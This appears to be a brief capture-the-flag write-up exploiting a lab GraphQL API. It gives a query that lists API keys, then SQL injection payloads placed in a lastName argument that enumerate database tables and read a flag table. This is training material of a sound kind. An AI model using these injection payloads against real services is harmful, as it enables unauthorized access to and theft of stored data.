### Exploit the vulnerable GraphQL API to obtain the flag.

```graphql
{  
activeApiKeys  
{  
id  
key  
role  
}  
}
```
![](Screenshot%202026-09-14%20at%2014.54.16.png)

Enumerate tables in database

```graphql
{ customerByName(apiKey: "0711a879ed751e63330a78a4b195bbad", lastName: "cn' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -") { id lastName firstName } }
```

![](Screenshot%202026-09-14%20at%2015.03.06.png)

```graphql
{
  customerByName(apiKey: "0711a879ed751e63330a78a4b195bbad", lastName: "cn' UNION SELECT 1,flag,3,4 FROM flag-- -") {
    id
    lastName
    firstName
  }
}
```
![](Screenshot%202026-09-14%20at%2015.01.31.png)